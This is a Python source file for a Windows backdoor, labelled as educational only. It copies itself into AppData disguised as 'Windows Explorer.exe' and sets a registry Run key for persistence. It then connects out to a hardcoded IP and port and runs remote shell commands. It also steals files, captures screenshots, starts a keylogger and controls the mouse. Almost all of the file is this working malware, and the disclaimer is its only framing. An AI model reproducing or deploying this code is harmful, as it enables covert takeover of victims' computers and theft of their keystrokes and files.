import json
import os
import shutil
import socket
import subprocess
import base64
import sys
from threading import Thread
import pyautogui
import webbrowser
from keyloger import Keyloger
import pyautogui as pg


class Backdoor:
    """
    Class Backdoor is defect in the algorithm that is intentionally embedded in it by the developer and allows unauthorized access to data
    or remote control of the operating system and the computer as a whole.
    THIS IS CREATED SOLELY for EDUCATIONAL PURPOSE!
        """
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        try:
            evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
            if not os.path.exists(evil_file_location):
                shutil.copyfile(sys.executable, evil_file_location)
                subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{evil_file_location}"')
        except Exception:
            pass

    def reliable_send(self, data):

        """To send data (commands) to another computer."""

        data = data.decode('utf-8', "replace")
        json_data = json.dumps(data).encode('utf-8', "replace")
        self.connection.send(json_data)

    def reliable_receive(self):

        """To receive data (response) from another computer."""

        json_data = ""
        json_data_all = ""
        while True:
            try:
                json_data = self.connection.recv(1024)
                json_data = json_data.decode('utf-8', "replace")
                json_data_all += json_data
                return json.loads(json_data_all)
            except ValueError:
                continue

    def execute_system_command(self, command):

        """Executes a command in the terminal. And returns the execution of this command."""

        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            return "error during command execution".encode('utf-8', "replace")

    def chage_working_directory_to(self, path):

        """Changes the directory."""

        os.chdir(path)
        path = "You are in " + path
        return path.encode('utf-8', "replace")

    def read_file(self, path):

        """To upload data to a file."""

        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):

        """To write data to a file."""

        with open(path, "wb") as file:
            content = base64.b64decode(content)
            file.write(content)
            return "[+] Upload successful".encode("utf-8", 'replace')

    def run(self):

        """Starting the main program"""

        while True:
            command = self.reliable_receive()
            command_result = "".encode("utf8", "replace")
            try:
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()
                elif command[0] == 'cd' and len(command) > 1:
                    command_result = self.chage_working_directory_to(command[1])
                elif command[0] == 'screenloger':
                    screen = pyautogui.screenshot('screenshot.png')
                    command_result = self.read_file('screenshot.png')
                elif command[0] == 'keyloger':
                    keylog = Keyloger()
                    thr = Thread(target=keylog.start_keyloger, daemon=True)
                    thr.start()
                    command_result = "Keyloger start".encode("utf8", "replace")
                elif command[0] == 'web':
                    webbrowser.open_new_tab(command[1])
                    command_result = f"'{command[1]}' website launched".encode("utf8", "replace")
                elif command[0] == 'download':
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                elif command[0] == "up" and len(command) == 1:
                    pg.move(0, -30, 0.5)
                elif command[0]  == "down" and len(command) == 1:
                    pg.move(0, 30, 0.5)
                elif command[0] == 'right' and len(command) == 1:
                    pg.move(30, 0, 0.5)
                elif command[0] == "left" and len(command) == 1:
                    pg.move(-30, 0, 0.5)
                elif command[0] == "click" and len(command) == 1:
                    pg.click()
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "Error, try again".encode("utf8", "replace")
            self.reliable_send(command_result)


"""If you want the program to run another file in parallel in a new process, then uncomment the bottom lines"""
# file_name = sys._MEIPASS + "The name of your file"
# subprocess.Popen(file_name, shell=True)

if __name__ == "__main__":
    try:
        my_backdoor = Backdoor('192.168.0.104', 4444) #Enter the ip address and any port.
        my_backdoor.run()
    except Exception:
        sys.exit()
